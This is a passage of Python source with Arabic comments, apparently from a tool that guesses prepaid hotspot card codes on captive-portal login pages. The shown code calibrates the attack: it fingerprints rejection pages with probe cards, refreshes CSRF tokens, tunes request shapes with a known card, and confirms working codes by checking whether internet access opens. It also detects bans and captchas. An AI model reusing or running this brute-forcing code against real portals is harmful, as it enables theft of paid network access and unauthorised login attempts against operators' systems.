        return cal  # إرجاع cal
    if store.space_size(p) <= 0:  # شرط: store.space_size(p) أصغر أو يساوي 0
        cal.error = "card_space_empty"  # إسناد القيمة الثابتة cal.error
        cal.step("profile_valid", False, "card_space_empty",  # استدعاء cal.step (4 معاملات)
                 {"prefix": p.get("prefix", ""), "length": p.get("length", 0),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                  "charset": p.get("charset", "")[:40]})  # مفتاح charset في القاموس
        return cal  # إرجاع cal

    session = new_session(headers=browser_headers(p, p["login_url"]))  # إسناد نتيجة استدعاء new_session (headers=…) إلى session

    try:  # بدايةtry محمية (يليها except/finally)
        # --- 1. هل نصل إلى صفحة الدخول أصلاً؟ ---------------------
        t0 = time.time()  # إسناد نتيجة استدعاء time.time إلى t0
        try:  # بدايةtry محمية (يليها except/finally)
            resp = session.get(p["login_url"], allow_redirects=True)  # إسناد نتيجة استدعاء session.get (معامل واحد، allow_redirects=…) إلى resp
        # تكملة السطر السابق داخل القوس
        except Exception as exc:                        # noqa: BLE001
            err = classify(exc, p["login_url"])  # إسناد نتيجة استدعاء classify (2 معاملات) إلى err
            cal.error = err.kind  # إسناد err.kind إلى cal.error
            cal.step("reach_login_page", False, f"net_{err.kind}",  # استدعاء cal.step (4 معاملات)
                     {"text": err.text[:200]})  # تكملة السطر السابق داخل القوس
            return cal  # إرجاع cal
        ms = (time.time() - t0) * 1000  # حساب ضرب بين طرح و1000 وإسناده إلى ms
        p["login_url"] = resp.url or p["login_url"]  # دمج منطقي (أو) وإسناده إلى p['login_url']
        # الصفحة التي جلبناها لتوّها هي المرجع في شكل الطلب —
        # الرمز الذي التقطه الفحص يخصّ جلسة أخرى
        p = absorb_form(p, resp.text, p["login_url"])  # إسناد نتيجة استدعاء absorb_form (3 معاملات) إلى p
        # absorb_form() ترجع نسخة مجدَّدة: أبقِ بروفايل المعايرة
        # يشير إليها، وإلا فالشكل الذي يجده الضابط أدناه سيُكتب
        # في قاموس لم يعد أحد يقرؤه
        cal.profile = p  # إسناد p إلى cal.profile

        # --- 1ب. هل الباب مغلق أصلاً؟ --------------------------------
        # صفحة ما زالت تعرض نموذج الدخول ليست صفحة حجب، حتى لو
        # ذكرت الحجب في مكان ما (عبارة «محظور» في حاشية،
        # أو «أبطئ» في تحذير) — تسمية ذلك حجباً كانت توقف كل
        # تشغيل على شبكات سليمة تماماً. صفحة الحجب الحقيقية
        # تستبدل النموذج.
        page_block, page_evidence, page_ban = _is_protective_reply(resp, p["login_url"])  # إسناد نتيجة استدعاء _is_protective_reply (2 معاملات) إلى مجموعة
        if page_block:  # شرط: page_block
            is_challenge = page_evidence == "captcha_challenge"  # مقارنة (يساوي) وإسناد النتيجة المنطقية إلى is_challenge
            cal.error = "captcha_challenge" if is_challenge else "blocked_already"  # إسناد 'captcha_challenge' إن is_challenge وإلا 'blocked_already' إلى cal.error
            cal.step("reach_login_page", False,  # استدعاء cal.step (4 معاملات)
                     "captcha_challenge" if is_challenge else "blocked_before_probes",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                     {"status": resp.status, "word": page_evidence,  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                      "ban_evidence": page_ban,  # مفتاح ban_evidence في القاموس
                      "advice": "stop_and_contact_network_admin"})  # مفتاح advice في القاموس
            return cal  # إرجاع cal
        page_word = find_phrase((resp.text or "").lower(), config.BAN_WORDS)  # إسناد نتيجة استدعاء find_phrase (2 معاملات) إلى page_word
        cal.step("reach_login_page", True,  # استدعاء cal.step (4 معاملات)
                 "http_ok_word_ignored" if page_word else "http_ok",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                 {"status": resp.status, "ms": round(ms),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                  "final_url": p["login_url"],  # مفتاح final_url في القاموس
                  "word": page_word,  # مفتاح word في القاموس
                  "note": "the page still offers the login form, so the block "  # مفتاح note في القاموس
                          "word in its text was ignored" if page_word else ""})  # تكملة السطر السابق داخل القوس

        # --- 2. هل الضيف متصل أم خلف جدار أم منقطع؟ -----------------
        cal.internet = verify.probe_internet(session, checks=checks)  # إسناد نتيجة استدعاء verify.probe_internet (معامل واحد، checks=…) إلى cal.internet
        state = cal.internet["state"]  # إسناد cal.internet['state'] إلى state
        # إن كان هذا الجهاز متصلاً أصلاً (واي‑فاي آخر، كابل، VPN) فـ
        # «الإنترنت يعمل» لا يثبت شيئاً عن البطاقة — نقول ذلك بدل
        # الادعاء. وعندها يحكم المحرك على الإصابات بدليل التحويل/الحالة.
        cal.step("internet_state", state in ("WALLED", "ONLINE"),  # استدعاء cal.step (4 معاملات)
                 "internet_online_verification_limited" if state == "ONLINE"  # تكملة السطر السابق داخل القوس
                 else f"internet_{state.lower()}",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                 {**{k: v for k, v in cal.internet.items() if k != "state"},  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                  "state": state})  # مفتاح state في القاموس

        # استخدم البطاقة المعروفة المُعطاة صراحةً مرة واحدة، بالشكل
        # المرصود حالياً للطلب، قبل إرسال أي تخمينات معايرة.
        known_preflight = None  # إسناد القيمة الثابتة known_preflight
        known_preflight_response = None  # إسناد القيمة الثابتة known_preflight_response
        known_preflight_tuned = None  # إسناد القيمة الثابتة known_preflight_tuned
        if known_card and learn_known:  # شرط مركّب (و)
            wrong = known_card_problem(p, known_card)  # إسناد نتيجة استدعاء known_card_problem (2 معاملات) إلى wrong
            if wrong:  # شرط: wrong
                cal.error = "known_card_out_of_format"  # إسناد القيمة الثابتة cal.error
                cal.step("shape_tuned", False, "known_card_out_of_format", wrong)  # استدعاء cal.step (4 معاملات)
                return cal  # إرجاع cal
            # إسناد نتيجة استدعاء _known_card_preflight (4 معاملات، checks=…) إلى مجموعة
            p, known_preflight, known_preflight_tuned, preflight_error, \
                known_preflight_response = _known_card_preflight(  # المعامل المسمّى known_preflight_response
                    p, known_card, session, cal.internet, checks=checks)  # تكملة السطر السابق داخل القوس
            cal.profile = p  # إسناد p إلى cal.profile
            if known_preflight.get("code") == "NET_ERROR":  # شرط: known_preflight.get('code') يساوي 'NET_ERROR'
                cal.error = known_preflight.get("reason") or "network_error"  # دمج منطقي (أو) وإسناده إلى cal.error
                cal.step("shape_tuned", False, f"net_{cal.error}",  # استدعاء cal.step (4 معاملات)
                         {"tried": 1, "trials": [known_preflight]})  # تكملة السطر السابق داخل القوس
                return cal  # إرجاع cal
            if preflight_error and preflight_error != "logout_unconfirmed":  # شرط مركّب (و)
                cal.error = ("captcha_challenge" if preflight_error == "captcha_challenge"  # إسناد 'captcha_challenge' إن مقارنة وإلا 'blocked_already' إلى cal.error
                             else "blocked_already")  # تكملة السطر السابق داخل القوس
                cal.step("shape_tuned", False,  # استدعاء cal.step (4 معاملات)
                         "captcha_challenge" if preflight_error == "captcha_challenge"  # تكملة السطر السابق داخل القوس
                         else "blocked_by_our_probes",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                         {"tried": 1, "trials": [known_preflight]})  # تكملة السطر السابق داخل القوس
                return cal  # إرجاع cal
            if preflight_error == "logout_unconfirmed":  # شرط: preflight_error يساوي 'logout_unconfirmed'
                cal.error = "logout_unconfirmed"  # إسناد القيمة الثابتة cal.error
                cal.step("shape_tuned", False, "logout_unconfirmed",  # استدعاء cal.step (4 معاملات)
                         {"tried": 1, "trials": [known_preflight]})  # تكملة السطر السابق داخل القوس
                return cal  # إرجاع cal
            if known_preflight_tuned:  # شرط: known_preflight_tuned
                cal.tuned = known_preflight_tuned  # إسناد known_preflight_tuned إلى cal.tuned
                cal.step("shape_tuned", True, "known_card_works",  # استدعاء cal.step (4 معاملات)
                         {"tuned": known_preflight_tuned, "tried": 1,  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                          "trials": [known_preflight]})  # مفتاح trials في القاموس
            else:  # مفتاح else في القاموس
                cal.step("known_card_preflight", False,  # استدعاء cal.step (4 معاملات)
                         "internet_transition_not_seen",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                         {"tried": 1, "trials": [known_preflight]})  # تكملة السطر السابق داخل القوس
                if preflight_only:  # شرط: preflight_only
                    cal.error = "known_card_not_proven"  # إسناد القيمة الثابتة cal.error
                    cal.step("shape_tuned", False, "known_card_not_proven",  # استدعاء cal.step (4 معاملات)
                             {"tried": 1, "trials": [known_preflight]})  # تكملة السطر السابق داخل القوس
                    return cal  # إرجاع cal

        # --- 3. تعلّم كيف تبدو البطاقة الخاطئة ----------------------
        probe_cards, replies = [], []  # إسناد مجموعة إلى مجموعة
        for card in bench_cards(  # دورة على bench_cards(p, max(2, min(int(probes أو 2), 4)), exclude=مجموعة إن known_card وإلا مجموعة) باسم card
                p, max(2, min(int(probes or 2), 4)),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                exclude=(known_card,) if known_card else ()):  # المعامل المسمّى exclude
            try:  # بدايةtry محمية (يليها except/finally)
                r = send_login(session, p, card)  # إسناد نتيجة استدعاء send_login (3 معاملات) إلى r
            # تكملة السطر السابق داخل القوس
            except Exception as exc:                    # noqa: BLE001
                err = classify(exc, p["login_url"])  # إسناد نتيجة استدعاء classify (2 معاملات) إلى err
                cal.step("rejection_probe", False, f"net_{err.kind}",  # استدعاء cal.step (4 معاملات)
                         {"card_hint": card[:4] + "...", "text": err.text[:160]})  # تكملة السطر السابق داخل القوس
                return cal  # إرجاع cal
            probe_cards.append(card)  # استدعاء probe_cards.append (معامل واحد)
            replies.append(r)  # استدعاء replies.append (معامل واحد)
            protective, evidence, ban_ev = _is_protective_reply(r, p["login_url"])  # إسناد نتيجة استدعاء _is_protective_reply (2 معاملات) إلى مجموعة
            if protective:  # شرط: protective
                cal.error = ("captcha_challenge" if evidence == "captcha_challenge"  # إسناد 'captcha_challenge' إن مقارنة وإلا 'blocked_already' إلى cal.error
                             else "blocked_already")  # تكملة السطر السابق داخل القوس
                cal.step("rejection_baseline", False,  # استدعاء cal.step (4 معاملات)
                         "captcha_challenge" if evidence == "captcha_challenge"  # تكملة السطر السابق داخل القوس
                         else "blocked_by_our_probes",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                         {"advice": "stop_and_contact_network_admin",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                          "status": r.status, "word": evidence,  # مفتاح status في القاموس
                          "ban_evidence": ban_ev,  # مفتاح ban_evidence في القاموس
                          "probes_sent": len(replies)})  # مفتاح probes_sent في القاموس
                return cal  # إرجاع cal
            # صفحات الرفض غالباً تدوّر رمز CSRF أحادي الاستخدام. المتصفح
            # يعرض النموذج الراجع ويرسل قيمته الجديدة؛ نفعل الشيء نفسه
            # بدل إعادة استخدام رمز الصفحة الأولى.
            p = absorb_form(p, r.text or "", r.url or p["login_url"])  # إسناد نتيجة استدعاء absorb_form (3 معاملات) إلى p
            cal.profile = p  # إسناد p إلى cal.profile

        if not replies:  # شرط معكوس: ليس replies
            # تعذّر بناء أي بطاقة تجريبية، أو ماتت كلها: بلا خط أساس
            # سيبدو أي شيء «غير مرفوض»، وسيرفع التشغيل تقارير
            # غير مثبتة بدل أن يقول ما الذي حدث.
            cal.error = "no_rejection_baseline"  # إسناد القيمة الثابتة cal.error
            cal.step("rejection_baseline", False, "no_probe_reply", {})  # استدعاء cal.step (4 معاملات)
            return cal  # إرجاع cal

        # 400/405/415/422 تعني أن الطرف رفض *الطلب* لا
        # البطاقة. وبلا بطاقة معروفة صالحة لا توجد طريقة صادقة لتسمية ذلك
        # خط أساس رفض: توقّف قبل إنفاق فضاء المستخدم كله.
        shape_statuses = [r.status for r in replies  # بناء اشتقاق قائمة وإسناده إلى shape_statuses
                          if r.status in (400, 405, 415, 422)]  # تكملة السطر السابق داخل القوس
        shape_refused = len(shape_statuses) == len(replies)  # مقارنة (يساوي) وإسناد النتيجة المنطقية إلى shape_refused
        if shape_refused and not known_card:  # شرط مركّب (و)
            cal.error = "request_shape_rejected"  # إسناد القيمة الثابتة cal.error
            cal.step("rejection_baseline", False, "request_shape_rejected",  # استدعاء cal.step (4 معاملات)
                     {"status": shape_statuses[:4],  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                      "advice": "match_browser_session_headers_or_javascript"})  # مفتاح advice في القاموس
            return cal  # إرجاع cal

        fp = Fingerprinter.learn(replies, login_reply=resp)  # إسناد نتيجة استدعاء Fingerprinter.learn (معامل واحد، login_reply=…) إلى fp
        cal.fingerprint = fp  # إسناد fp إلى cal.fingerprint
        cal.step("rejection_baseline", True, "learned",  # استدعاء cal.step (4 معاملات)
                 {"exact": fp.exact, "dynamic_tokens": fp.dynamic_count,  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                  "samples": fp.samples,  # مفتاح samples في القاموس
                  "masked_values": len(fp.literals),  # مفتاح masked_values في القاموس
                  "status": fp.reject_status, "length": fp.reject_len,  # مفتاح status في القاموس
                  "sample_cards": [c[:6] + "..." for c in probe_cards],  # مفتاح sample_cards في القاموس
                  "note": fp.note})  # مفتاح note في القاموس

        # بطاقة تجريبية بدت مقبولة هي بطاقة معروفة مجانية.
        if not known_card:  # شرط معكوس: ليس known_card
            probe_judge = Judge(fp, p["login_url"], keyword and [keyword] or [])  # إسناد نتيجة استدعاء Judge (3 معاملات) إلى probe_judge
            for i, (card, r) in enumerate(zip(probe_cards, replies)):  # دورة على enumerate(zip(probe_cards, replies)) باسم مجموعة
                v = probe_judge.classify(r, submitted_values(p, card))  # إسناد نتيجة استدعاء probe_judge.classify (2 معاملات) إلى v
                if v.is_hit:  # شرط: v.is_hit
                    known_card = card  # إسناد card إلى known_card
                    cal.step("probe_looked_accepted", True, v.reason,  # استدعاء cal.step (4 معاملات)
                             {"card_hint": card[:4] + "..."})  # تكملة السطر السابق داخل القوس
                    # يجب ألا تبقى داخل خط أساس «البطاقة الخاطئة»، وإلا
                    # ستتعلّم الأداة صفحة النجاح كصفحة رفض
                    rest = [x for j, x in enumerate(replies) if j != i]  # بناء اشتقاق قائمة وإسناده إلى rest
                    if len(rest) >= 2:  # شرط: len(rest) أكبر أو يساوي 2
                        fp = Fingerprinter.learn(rest, login_reply=resp)  # إسناد نتيجة استدعاء Fingerprinter.learn (معامل واحد، login_reply=…) إلى fp
                        cal.fingerprint = fp  # إسناد fp إلى cal.fingerprint
                        cal.step("rejection_baseline", True,  # استدعاء cal.step (4 معاملات)
                                 "relearned_without_the_working_probe",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                                 {"exact": fp.exact, "samples": fp.samples})  # تكملة السطر السابق داخل القوس
                    break  # قطع الحلقة فوراً

        # --- 4. اضبط فقط إن لم يُثبت طلب البطاقة المعروف الدقيق ---
        if known_preflight_response is not None and known_preflight:  # شرط مركّب (و)
            first_judge = Judge(fp, p["login_url"])  # إسناد نتيجة استدعاء Judge (2 معاملات) إلى first_judge
            first_verdict = first_judge.classify(  # إسناد نتيجة استدعاء first_judge.classify (2 معاملات) إلى first_verdict
                known_preflight_response, submitted_values(p, known_card))  # تكملة السطر السابق داخل القوس
            known_preflight.update({"code": first_verdict.code,  # استدعاء known_preflight.update (معامل واحد)
                                    "reason": first_verdict.reason})  # مفتاح reason في القاموس
            if cal.tuned:  # شرط: cal.tuned
                words = _new_words(known_preflight_response.text or "", fp.reject_text)  # إسناد نتيجة استدعاء _new_words (2 معاملات) إلى words
                cal.success_words = words  # إسناد words إلى cal.success_words
                p["success_words"] = words  # إسناد words إلى p['success_words']
                for step in cal.steps:  # دورة على cal.steps باسم step
                    if step.get("id") == "shape_tuned" and step.get("ok"):  # شرط مركّب (و)
                        step.setdefault("detail", {})["words"] = words[:6]  # إسناد words[] إلى step.setdefault('detail', قاموس)['words']
        if learn_known and known_card and not cal.tuned:  # شرط مركّب (و)
            preflight_trials = [known_preflight] if known_preflight else []  # إسناد قائمة إن known_preflight وإلا قائمة إلى preflight_trials
            skip_shape = None  # إسناد القيمة الثابتة skip_shape
            if known_preflight:  # شرط: known_preflight
                skip_shape = (known_preflight.get("method", "").lower(),  # إسناد مجموعة إلى skip_shape
                              p.get("dst_value", ""), p.get("pass_mode", "empty"),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                              bool(p.get("send_dst")), bool(p.get("send_popup")))  # تكملة السطر السابق داخل القوس
            p, words, tuned, trials = _tune_with_known_card(  # إسناد نتيجة استدعاء _tune_with_known_card (4 معاملات، checks=…، internet_before=…، initial_trials=…، skip_shape=…) إلى مجموعة
                p, known_card, fp, session, checks=checks,  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                internet_before=cal.internet,  # المعامل المسمّى internet_before
                initial_trials=preflight_trials,  # المعامل المسمّى initial_trials
                skip_shape=skip_shape)  # المعامل المسمّى skip_shape
            cal.profile = p  # إسناد p إلى cal.profile
            if words:  # شرط: words
                cal.success_words = words  # إسناد words إلى cal.success_words
                p["success_words"] = words  # إسناد words إلى p['success_words']
            if tuned:  # شرط: tuned
                cal.tuned = tuned  # إسناد tuned إلى cal.tuned
                cal.step("shape_tuned", True, "known_card_works",  # استدعاء cal.step (4 معاملات)
                         {"tuned": tuned, "words": words[:6],  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                          "tried": len(trials),  # مفتاح tried في القاموس
                          "trials": _summarise_trials(trials)})  # مفتاح trials في القاموس
            else:  # مفتاح else في القاموس
                logout_unconfirmed = any(  # إسناد نتيجة استدعاء any (معامل واحد) إلى logout_unconfirmed
                    (t.get("logout") or {}).get("internet_after") != "WALLED"  # تكملة السطر السابق داخل القوس
                    for t in trials if t.get("logout"))  # تكملة السطر السابق داخل القوس
                if logout_unconfirmed:  # شرط: logout_unconfirmed
                    cal.error = "logout_unconfirmed"  # إسناد القيمة الثابتة cal.error
                cal.step("shape_tuned", False,  # استدعاء cal.step (4 معاملات)
                         "logout_unconfirmed" if logout_unconfirmed  # تكملة السطر السابق داخل القوس
                         else "known_card_not_proven",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                         {"tried": len(trials),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                          "trials": _summarise_trials(trials)})  # مفتاح trials في القاموس
            if shape_refused and not cal.tuned:  # شرط مركّب (و)
                # كل بطاقات التعلّم وكل أشكال البطاقة المعروفة رُفضت
                # قبل الحكم على بيانات الدخول. لا تبدأ تشغيلاً
                # لا يستطيع إلا تكرار HTTP 400 ألف مرة.
                cal.error = "request_shape_rejected"  # إسناد القيمة الثابتة cal.error
                cal.step("rejection_baseline", False,  # استدعاء cal.step (4 معاملات)
                         "request_shape_rejected",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                         {"status": shape_statuses[:4],  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                          "advice":  # مفتاح advice في القاموس
                              "match_browser_session_headers_or_javascript"})  # تكملة السطر السابق داخل القوس
                return cal  # إرجاع cal

        if keyword:  # شرط: keyword
            words = list(dict.fromkeys(list(cal.success_words) + [keyword]))  # إسناد نتيجة استدعاء list (معامل واحد) إلى words
            cal.success_words = words  # إسناد words إلى cal.success_words
            p["success_words"] = words  # إسناد words إلى p['success_words']

        cal.judge = Judge(fp, p["login_url"], success_words=cal.success_words,  # إسناد نتيجة استدعاء Judge (2 معاملات، success_words=…، success_url_contains=…) إلى cal.judge
                          success_url_contains=p.get("success_url_contains", ""))  # المعامل المسمّى success_url_contains
        cal.ok = True  # إسناد القيمة الثابتة cal.ok
        return cal  # إرجاع cal
    finally:  # مفتاح finally في القاموس
        session.close()  # استدعاء session.close


def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,  # تعريف الدالة _tune_with_known_card(p, known_card, fp, session, checks, internet_before, initial_trials, skip_shape)
                          checks=None, internet_before=None, initial_trials=None,  # المعامل المسمّى checks
                          skip_shape=None):  # المعامل المسمّى skip_shape
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """Try the sensible (password value x dst) combinations for the good card.

    Returns (profile, success_words, tuned, trials). Every trial is recorded
    with a redacted request shape and a network-state check; a success is not
    trusted until the logout restores the previously walled state.
    """  # نهاية النص متعدد الأسطر
    dsts = list(dict.fromkeys([p.get("dst_value", ""), ""]))  # إسناد نتيجة استدعاء list (معامل واحد) إلى dsts
    modes = ["empty", "same", "omit", "chap", "chap_empty",  # إسناد قائمة إلى modes
             "md5user", "sha1user", "sha256user"]  # تكملة قيمة المفتاح/العنصر السابق
    if p.get("chap") is None:  # شرط: p.get('chap') هو نفسه None
        modes = [m for m in modes if not m.startswith("chap")]  # بناء اشتقاق قائمة وإسناده إلى modes
    best = None  # إسناد القيمة الثابتة best
    trials = list(initial_trials or [])  # إسناد نتيجة استدعاء list (معامل واحد) إلى trials
    before_state = (internet_before or {}).get("state", "UNKNOWN")  # إسناد نتيجة استدعاء internet_before أو قاموس.get (2 معاملات) إلى before_state
    methods = [m for m in ((p.get("method") or "post").lower(), "get", "post")  # بناء اشتقاق قائمة وإسناده إلى methods
               if m in ("get", "post")]  # تكملة السطر السابق داخل القوس
    methods = list(dict.fromkeys(methods))  # إسناد نتيجة استدعاء list (معامل واحد) إلى methods
    original = ((p.get("method") or "post").lower(),  # إسناد مجموعة إلى original
                p.get("dst_value", ""), p.get("pass_mode") or "empty",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                bool(p.get("send_dst")), bool(p.get("send_popup")))  # تكملة السطر السابق داخل القوس
    modes = list(dict.fromkeys([original[2]] + modes))  # إسناد نتيجة استدعاء list (معامل واحد) إلى modes
    flag_shapes = list(dict.fromkeys([  # إسناد نتيجة استدعاء list (معامل واحد) إلى flag_shapes
        (original[3], original[4]), (False, False), (True, False),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
        (False, True), (True, True)]))  # تكملة السطر السابق داخل القوس
    candidates = [(method, dst, mode, send_dst, send_popup)  # بناء اشتقاق قائمة وإسناده إلى candidates
                  for method in methods for dst in dsts for mode in modes  # تكملة السطر السابق داخل القوس
                  for send_dst, send_popup in flag_shapes]  # تكملة السطر السابق داخل القوس
    candidates.sort(key=lambda x: ((x[0] != original[0]) +  # استدعاء candidates.sort (key=…)
                                   (x[1] != original[1]) +  # تكملة السطر السابق داخل القوس
                                   (x[2] != original[2]) +  # تكملة السطر السابق داخل القوس
                                   (x[3] != original[3]) +  # تكملة السطر السابق داخل القوس
                                   (x[4] != original[4]),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                                  methods.index(x[0]), dsts.index(x[1]),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                                  modes.index(x[2]), flag_shapes.index((x[3], x[4]))))  # تكملة السطر السابق داخل القوس
    if skip_shape:  # شرط: skip_shape
        candidates = [x for x in candidates if x != tuple(skip_shape)]  # بناء اشتقاق قائمة وإسناده إلى candidates

    remaining = max(0, config.KNOWN_CARD_TRIAL_LIMIT - len(trials))  # إسناد نتيجة استدعاء max (2 معاملات) إلى remaining
    for method, dst, mode, send_dst, send_popup in candidates[:remaining]:  # دورة على candidates[] باسم مجموعة
        trial = dict(p)  # إسناد نتيجة استدعاء dict (معامل واحد) إلى trial
        trial["pass_mode"] = mode  # إسناد mode إلى trial['pass_mode']
        trial["dst_value"] = dst  # إسناد dst إلى trial['dst_value']
        trial["method"] = method  # إسناد method إلى trial['method']
        trial["send_dst"] = send_dst  # إسناد send_dst إلى trial['send_dst']
        trial["send_popup"] = send_popup  # إسناد send_popup إلى trial['send_popup']
        shape = safe_request_shape(trial, known_card)  # إسناد نتيجة استدعاء safe_request_shape (2 معاملات) إلى shape
        judge = Judge(fp, p["login_url"])  # إسناد نتيجة استدعاء Judge (2 معاملات) إلى judge
        try:  # بدايةtry محمية (يليها except/finally)
            r = send_login(session, trial, known_card)  # إسناد نتيجة استدعاء send_login (3 معاملات) إلى r
        # تكملة السطر السابق داخل القوس
        except Exception as exc:                         # noqa: BLE001
            err = classify(exc, trial.get("login_url", ""))  # إسناد نتيجة استدعاء classify (2 معاملات) إلى err
            trials.append({**shape, "mode": mode, "dst": _safe_url_shape(dst, trial),  # استدعاء trials.append (معامل واحد)
                           "code": err.kind.upper(), "reason": err.kind,  # مفتاح code في القاموس
                           "status": None, "location": "", "word": "",  # مفتاح status في القاموس
                           "internet_before": before_state,  # مفتاح internet_before في القاموس
                           "internet_after": "NOT_CHECKED"})  # مفتاح internet_after في القاموس
            break  # قطع الحلقة فوراً
        verdict = judge.classify(r, submitted_values(trial, known_card))  # إسناد نتيجة استدعاء judge.classify (2 معاملات) إلى verdict
        body = (r.text or "").lower()  # إسناد نتيجة استدعاء r.text أو ''.lower إلى body
        p = absorb_form(trial, r.text or "", r.url or trial["login_url"])  # إسناد نتيجة استدعاء absorb_form (3 معاملات) إلى p
        protective, protective_reason, ban_ev = _is_protective_reply(r, p["login_url"])  # إسناد نتيجة استدعاء _is_protective_reply (2 معاملات) إلى مجموعة
        if protective:  # شرط: protective
            verdict_code = ("CHALLENGE" if protective_reason == "captcha_challenge"  # إسناد 'CHALLENGE' إن مقارنة وإلا 'RATE_LIMITED' إن مقارنة وإلا 'BANNED' إلى verdict_code
                            else "RATE_LIMITED" if r.status == 429 else "BANNED")  # تكملة السطر السابق داخل القوس
            trials.append({**shape, "mode": mode, "dst": _safe_url_shape(dst, trial),  # استدعاء trials.append (معامل واحد)
                           "status": r.status, "code": verdict_code,  # مفتاح status في القاموس
                           "reason": protective_reason,  # مفتاح reason في القاموس
                           "response_bytes": r.length,  # مفتاح response_bytes في القاموس
                           "content_type": r.header("content-type").split(";")[0],  # مفتاح content_type في القاموس
                           "location": _safe_url_shape(r.location, trial) if r.location else "",  # مفتاح location في القاموس
                           "word": protective_reason,  # مفتاح word في القاموس
                           "ban_evidence": ban_ev,  # مفتاح ban_evidence في القاموس
                           "internet_before": before_state,  # مفتاح internet_before في القاموس
                           "internet_after": "NOT_CHECKED"})  # مفتاح internet_after في القاموس
            break  # قطع الحلقة فوراً

        time.sleep(max(0.0, config.KNOWN_CARD_VERIFY_DELAY_SECONDS))  # استدعاء time.sleep (معامل واحد)
        online, info = verify.verify_online(session, checks=checks)  # إسناد نتيجة استدعاء verify.verify_online (معامل واحد، checks=…) إلى مجموعة
        transition = before_state != "ONLINE" and online  # دمج منطقي (و) وإسناده إلى transition
        evidence = 1.0 if transition else 0.0  # إسناد 1.0 إن transition وإلا 0.0 إلى evidence
        if r.is_redirect():  # شرط: نتيجة r.is_redirect()
            host = (r.location.split("//")[-1].split("/")[0] or "").lower()  # إسناد نتيجة استدعاء r.location.split('//')[نفي/سالب].split('/')[0] أو ''.lower إلى host
            if host and host != (p["login_url"].split("//")[-1]  # شرط مركّب (و)
                                 .split("/")[0].lower()):  # تكملة تعريف متعدد الأسطر
                evidence = max(evidence, 0.9)  # إسناد نتيجة استدعاء max (2 معاملات) إلى evidence
        if verdict.is_hit:  # شرط: verdict.is_hit
            evidence = max(evidence, verdict.confidence)  # إسناد نتيجة استدعاء max (2 معاملات) إلى evidence
        logout_record = None  # إسناد القيمة الثابتة logout_record
        logout_state = "NOT_REQUIRED"  # إسناد القيمة الثابتة logout_state
        if transition or (evidence and before_state != "ONLINE"):  # شرط مركّب (أو)
            logout = verify.logout(session, p["login_url"])  # إسناد نتيجة استدعاء verify.logout (2 معاملات) إلى logout
            post_logout = verify.probe_internet(session, checks=checks)  # إسناد نتيجة استدعاء verify.probe_internet (معامل واحد، checks=…) إلى post_logout
            logout_state = post_logout.get("state", "UNKNOWN")  # إسناد نتيجة استدعاء post_logout.get (2 معاملات) إلى logout_state
            logout_record = {"request_ok": bool(logout.get("ok")),  # إسناد قاموس إلى logout_record
                             "status": logout.get("status"),  # مفتاح status في القاموس
                             "internet_after": logout_state}  # مفتاح internet_after في القاموس
            if logout_state != "WALLED" or not transition:  # شرط مركّب (أو)
                # التحويل أو تغيّر الصفحة قد يوحيان بالقبول، لكن وحده
                # انتقال مُقاس من WALLED إلى ONLINE يثبت هذه البطاقة.
                evidence = 0.0  # إسناد القيمة الثابتة evidence
        else:  # مفتاح else في القاموس
            evidence = 0.0  # إسناد القيمة الثابتة evidence
        row = {**shape, "mode": mode, "dst": _safe_url_shape(dst, trial),  # إسناد قاموس إلى row
               "status": r.status, "code": verdict.code,  # مفتاح status في القاموس
               "reason": verdict.reason, "response_bytes": r.length,  # مفتاح reason في القاموس
               "content_type": r.header("content-type").split(";")[0],  # مفتاح content_type في القاموس
               "location": _safe_url_shape(r.location, trial) if r.location else "",  # مفتاح location في القاموس
               "word": (verdict.data or {}).get("word")  # مفتاح word في القاموس
                       or find_phrase(body, config.REJECT_WORDS)  # تكملة السطر السابق داخل القوس
                       or find_phrase(body, config.BAN_WORDS),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
               "internet_before": before_state,  # مفتاح internet_before في القاموس
               "internet_after": info.get("state", "UNKNOWN"),  # مفتاح internet_after في القاموس
               "online_transition": transition, "logout": logout_record}  # مفتاح online_transition في القاموس
        trials.append(row)  # استدعاء trials.append (معامل واحد)
        if logout_record and logout_state != "WALLED":  # شرط مركّب (و)
            break  # قطع الحلقة فوراً
        if evidence:  # شرط: evidence
            words = _new_words(r.text or "", fp.reject_text)  # إسناد نتيجة استدعاء _new_words (2 معاملات) إلى words
            candidate = {"mode": mode, "method": method, "dst": dst,  # إسناد قاموس إلى candidate
                         "send_dst": send_dst, "send_popup": send_popup,  # مفتاح send_dst في القاموس
                         "trial": row, "evidence": evidence, "verified": transition,  # مفتاح trial في القاموس
                         "internet": info.get("detail", ""),  # مفتاح internet في القاموس
                         "internet_state": info.get("state", "UNKNOWN"),  # مفتاح internet_state في القاموس
                         "logout": logout_record,  # مفتاح logout في القاموس
                         "location": row["location"], "words": words}  # مفتاح location في القاموس
            if best is None or candidate["evidence"] > best["evidence"]:  # شرط مركّب (أو)
                best = candidate  # إسناد candidate إلى best
            break  # قطع الحلقة فوراً
